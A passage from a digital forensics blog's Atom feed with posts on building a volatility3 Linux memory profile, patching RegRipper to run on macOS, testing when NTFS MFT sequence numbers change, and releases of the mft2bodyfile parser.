<p>What has happened? Clearly, it doesn't make sense to iterate through <code>1_000_000</code> numbers, while we're only interested in the first <code>100_000</code>. Because when using a loop we know the order of the execution, we can abort as soon as we crossed the border to uninteresting numbers (those above <code>100_000</code>). In our test case, this has a similar effect to the performance such as using parallel iterators.</p>
<p>So, again: First you need to completely understand your problem, choose the best matching algorithm, and implement it correctly. Then, you can optimize.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Analyzing Linux memory images with volatility]]></title>
        <id>https://janstarke.github.io/blog/2022/04/04/centos7-volatility</id>
        <link href="https://janstarke.github.io/blog/2022/04/04/centos7-volatility"/>
        <updated>2022-04-04T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Why volatility3? Because version 2 is deprecated.]]></summary>
        <content type="html"><![CDATA[<p>Why volatility3? Because version 2 is deprecated.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># download the current git repo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/volatilityfoundation/volatility3.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># create local python venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m venv venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">source venv/bin/activate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># install volatility</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd volatility3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip3 install -r requirements.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 setup.py build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 setup.py install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>At this point in history, you have volatility3 installed in <code>venv</code>.</p>
<h1>Obtaining a matching profile</h1>
<p>Volatility needs to know a lot about the memory layout you're going to work with. Because every linux kernel can have a different layout, you need to get the special layout for your kernel. volatility calls this the <em>profile</em>.</p>
<p>To generate the profile, you need the following:</p>
<ul>
<li>the tool <code>dwarf2json</code>, which is a separate github project</li>
<li>the kernel with debug information (<em>not</em> the debug kernel)</li>
<li>the <code>System.map</code> file</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="installing-dwarf2json">Installing <code>dwarf2json</code><a class="hash-link" aria-label="Direct link to installing-dwarf2json" title="Direct link to installing-dwarf2json" href="https://janstarke.github.io/blog/2022/04/04/centos7-volatility#installing-dwarf2json">​</a></h2>
<p>Assuming you already have the go language installed, you can do the following:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/volatilityfoundation/dwarf2json.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd dwarf2json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This compiles a binary file named <code>dwarf2json</code> in the current directory. Copy it to whereever you want.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="obtaining-the-kernel-with-debug-information">Obtaining the kernel with debug information`<a class="hash-link" aria-label="Direct link to Obtaining the kernel with debug information`" title="Direct link to Obtaining the kernel with debug information`" href="https://janstarke.github.io/blog/2022/04/04/centos7-volatility#obtaining-the-kernel-with-debug-information">​</a></h2>
<p>First, you need to know the exact kernel version. I managed to get it by <code>grep</code>ping for <code>Linux version</code> in the memory image and obtained <code>3.10.0-862.3.2.el7.x86_64</code>. For the distribution and this version, there existed a package named <code>kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm</code>, which I downloaded from the official repository. Now, you can extract the required file. I used <code>rpm2cpio</code> for this:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir tmp_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd tmp_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rpm2cpio ../kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The resulting file in my case was <code>usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux</code>. Let's keep this in mind...</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="obtaining-systemmap">Obtaining System.map<a class="hash-link" aria-label="Direct link to Obtaining System.map" title="Direct link to Obtaining System.map" href="https://janstarke.github.io/blog/2022/04/04/centos7-volatility#obtaining-systemmap">​</a></h2>
<p>This file is part of the normal kernel package: <code>kernel-3.10.0-862.3.2.el7.x86_64.rpm</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir tmp_system_map</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd tmp_system_map</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rpm2cpio ../kernel-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found the <code>System.map</code> as <code>boot/System.map-3.10.0-862.3.2.el7.x86_64</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="generating-the-profile">Generating the profile<a class="hash-link" aria-label="Direct link to Generating the profile" title="Direct link to Generating the profile" href="https://janstarke.github.io/blog/2022/04/04/centos7-volatility#generating-the-profile">​</a></h2>
<p>Now, we have all we need. Let's go</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dwarf2json/dwarf2json linux \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        --elf tmp_kernel/usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        --system-map tmp_system_map/boot/System.map-3.10.0-862.3.2.el7.x86_64 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &gt;centos7-3.10.0-862.3.2.el7.x86_64.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># cleaning up</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rm -rf tmp_*</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Installing the profile</h1>
<p>volatility expects the profile as <em>xz</em> file, so let's compress it:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xz centos7-3.10.0-862.3.2.el7.x86_64.json</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Assume, you have <em>Python v3.9</em> and <em>volatility3 v2.0.3</em>, then you symbols directory is <code>venv/lib/python3.9/site-packages/volatility3-2.0.3-py3.9.egg/volatility3/symbols/</code>. We will refer to it as <code>$SYMBOLS_DIR</code>:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir $SYMBOLS_DIR/linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv centos7-3.10.0-862.3.2.el7.x86_64.json.xz $SYMBOLS_DIR/linux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>That's it. Now, you have a matching profile ready to be used.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Using regripper on MacOS]]></title>
        <id>https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin</id>
        <link href="https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin"/>
        <updated>2021-11-02T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Fixing construction of the plugins path]]></summary>
        <content type="html"><![CDATA[<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/keydet89/RegRipper3.0.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cpan install Parse::Win32Registry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># find out where Parse::Win32Registry was installed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp -r /usr/local/Cellar/perl/5.34.0/lib/perl5/site_perl/5.34.0/Parse .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv *.pm Parse/Win32Registry/WinNT/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fixing-construction-of-the-plugins-path">Fixing construction of the <code>plugins</code> path<a class="hash-link" aria-label="Direct link to fixing-construction-of-the-plugins-path" title="Direct link to fixing-construction-of-the-plugins-path" href="https://janstarke.github.io/blog/2021/11/02/Using-regripper-on-darwin#fixing-construction-of-the-plugins-path">​</a></h2>
<p>On unixoid systems, <code>rip.pl</code> ignores the folder where it is stored and looks for the <code>plugins</code> folder in the current working directory (<a href="https://github.com/keydet89/RegRipper3.0/issues/42" target="_blank" rel="noopener noreferrer">https://github.com/keydet89/RegRipper3.0/issues/42</a>). This can be fixed using the following patch:</p>
<div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">diff --git a/Analysis/RegRipper3.0/rip.pl b/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">index 8f626a7..9027209 100644</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--- a/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ b/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@@ -67,7 +67,7 @@ $str =~ s/($path[scalar(@path) - 1])//;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # code updated 20190318</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> my $plugindir;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ($^O eq "MSWin32") ? ($plugindir = $str."plugins/")</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-                   : ($plugindir = File::Spec-&gt;catfile("plugins"));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+                   : ($plugindir = File::Spec-&gt;catfile($str, "plugins"));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #my $plugindir = $str."plugins/";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #my $plugindir = File::Spec-&gt;catfile("plugins");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #print "Plugins Dir = ".$plugindir."\n";</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Usage example</h1>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PERL5LIB=$(pwd) perl rip.pl -r Amcache.hve -p amcache_tln &gt;amcache.tln</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Convert <code>TLN</code> format to <code>bodyfile</code> format</h1>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">awk -F '|' '{OFS="|";print 0,$5,0,0,0,0,0,-1,$1,-1,-1}' &lt;test.tln |TZ=UTC mactime -b - -d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Forensic analysis of deleted `$MFT` entries]]></title>
        <id>https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence</id>
        <link href="https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence"/>
        <updated>2021-10-22T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In the book FILE SYSTEM FORENSIC ANALYSIS, the author Brian Carrier states that "Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2." (page 276).]]></summary>
        <content type="html"><![CDATA[<p>In the book <em>FILE SYSTEM FORENSIC ANALYSIS</em>, the author <em>Brian Carrier</em> states that <em>"Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2."</em> (page 276).</p>
<p>I think this i partially wrong. Let's see what Microsoft is saying: <em>"The sequence number. This value is incremented each time that a file record segment is freed; it is 0 if the segment is not used. The SequenceNumber field of a file reference must match the contents of this field; if they do not match, the file reference is incorrect and probably obsolete."</em> (<a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header</a>)</p>
<p>This information is crucial when you found a file which has been content of some deleted folder. To retrieve the folders name, you need to find its <code>$FILE_NAME</code> information. So, you take the <code>parent</code> field from the <code>$FILE_NAME</code>attribute of the deleted file. Let's assume this is <code>313-1</code> (where <code>313</code> is the parent entry number and <code>1</code> is its sequence number). Further, let's assume that this parent has been deleted, but the MFT entry was not reallocated:</p>
<ul>
<li>If the sequence number was incremented upon reallocated, it would still be <code>1</code></li>
<li>Otherwise, if the sequence number was incremented when deleting the folder, it would be <code>2</code> now.</li>
</ul>
<p>But how can we be sure that we can use the <code>$FILE_NAME</code> of <code>313-2</code>, if the deleted file refered to <code>313-1</code>?</p>
<h1>Let's test what happens.</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="test-setup">Test setup<a class="hash-link" aria-label="Direct link to Test setup" title="Direct link to Test setup" href="https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence#test-setup">​</a></h2>
<p>I created a NTFS partition using Windows 8, and created three folders:</p>
<ul>
<li><code>bulk delete</code></li>
<li><code>single delete</code></li>
<li><code>mixed delete</code></li>
</ul>
<p>Each folder had two files: <code>sample1.rtf</code> and <code>samples.rtf</code>. Than I did the following:</p>
<ul>
<li>delete <code>bulk delete</code> with all its contents</li>
<li>delete <code>mixed delete/sample2.rtf</code></li>
<li>delete <code>mixed delete</code> with all of its contents (<code>sample1.rtf</code>)</li>
<li>delete <code>single delete/sample1.rtf</code></li>
<li>delete <code>single delete/sample2.rtf</code></li>
<li>delete <code>single delete</code> with all of its contents (none)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="results">Results<a class="hash-link" aria-label="Direct link to Results" title="Direct link to Results" href="https://janstarke.github.io/blog/2021/10/22/mft_entry_sequence#results">​</a></h2>
<p>After deletion, I found the following MFT references</p>
<table><thead><tr><th>Name</th><th>Entry #</th><th>Parent entry #</th></tr></thead><tbody><tr><td><code>bulk delete</code></td><td><code>37-2</code></td><td><code>5-5</code></td></tr><tr><td><code>bulk delete/sample1.rtf</code></td><td><code>43-2</code></td><td><code>37-1</code></td></tr><tr><td><code>bulk delete/sample2.rtf</code></td><td><code>44-2</code></td><td><code>37-1</code></td></tr><tr><td><code>single delete</code></td><td><code>41-2</code></td><td></td></tr><tr><td><code>single delete/sample1.rtf</code></td><td><code>47-2</code></td><td><code>41-1</code></td></tr><tr><td><code>single delete/sample2.rtf</code></td><td><code>48-2</code></td><td><code>41-1</code></td></tr><tr><td><code>mixed delete</code></td><td><code>42-2</code></td><td></td></tr><tr><td><code>mixed delete/sample1.rtf</code></td><td><code>45-1</code></td><td><code>42-1</code></td></tr><tr><td><code>mixed delete/sample2.rtf</code></td><td><code>46-1</code></td><td><code>42-1</code></td></tr></tbody></table>
<p>Obviously, our test shows that sequence numbers are incremented right after deletion, but <em>not</em> nessecarily at reallocation. The Microsoft documentation is right.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[$MFT file parser improved]]></title>
        <id>https://janstarke.github.io/blog/2021/10/17/mft2bodyfile2</id>
        <link href="https://janstarke.github.io/blog/2021/10/17/mft2bodyfile2"/>
        <updated>2021-10-17T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[I added some improvements to mft2bodyfile (https]]></summary>
        <content type="html"><![CDATA[<p>I added some improvements to <code>mft2bodyfile</code> (<a href="https://github.com/janstarke/mft2bodyfile" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/mft2bodyfile</a>) and released version <em>0.5.0</em>. Mainly, the following things have changed:</p>
<ul>
<li>I fixed the problem with nonresident attributes: <code>mft2bodyfile</code> reads all (really: <em>all</em>) MFT entries and tries to correlate them. This is possible, because there is a bidirectional relationship between the base entry and the nonbase entries. Until now, I started with the base entry and tried to find the corresponding nonbase entries, which failed if the <code>$ATTRIBUTE_LIST</code> was nonresident. Now, I don't try to find the nonbase entries, but instead use the base reference to find the base entry.</li>
<li>The performance has improved a lot.</li>
</ul>
<p>Only one thing (at the moment): Sometimes there are nonbase entries which belonged to base entries of deleted files (this can be detected to the sequence numbers of the base reference and the entry at the base position do not match). This is no problem, until we try to read <code>$STANDARD_INFORMATION</code>or <code>$FILENAME</code>, which may not be existing anymore. These entries are ignored by <code>mft2bodyfile</code>.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[$MFT file parser finalized]]></title>
        <id>https://janstarke.github.io/blog/2021/05/16/mft2bodyfile</id>
        <link href="https://janstarke.github.io/blog/2021/05/16/mft2bodyfile"/>
        <updated>2021-05-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[After some days of work, I finalized version 0.3.0 of mft2bodyfile (https://github.com/janstarke/mft2bodyfile), which is aimed to be a replacement for analyze_mft.py, which is abandoned.]]></summary>
        <content type="html"><![CDATA[<p>After some days of work, I finalized version <em>0.3.0</em> of <code>mft2bodyfile</code> (<a href="https://github.com/janstarke/mft2bodyfile" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/mft2bodyfile</a>), which is aimed to be a replacement for <code>analyze_mft.py</code>, which is abandoned.</p>
<p>Until now, me and my team used <code>analyze_mft.py</code> to extract data from the <code>$MFT</code>, when we got triage data from a customer. Unfortunately, <code>analyze_mft.py</code> has some disadvantages:</p>
<ul>
<li>python2 is required</li>
<li>either the <code>$STANDARD_INFORMATION</code> or the <code>$FILE_NAME</code> attribute used to generate the timestamps, bot not both of them at the same time. This always required us to merge both outputs, which is a little bit messy</li>
<li>from time to time we had problems parsing the <code>$MFT</code></li>
</ul>
<p>So, at first we started to work on <code>analyze_mft.py</code> to fix our complaints, but we soon got stuck when we discovered one additional disadvantage:</p>
<ul>
<li>If a file has its <code>$FILE_NAME</code> attribute not stored in its base entry, but in some nonbase entry which is refered by an <code>$ATTRIBUTE_LIST</code> attribute, then this file is not shown in the bodyfile.</li>
</ul>
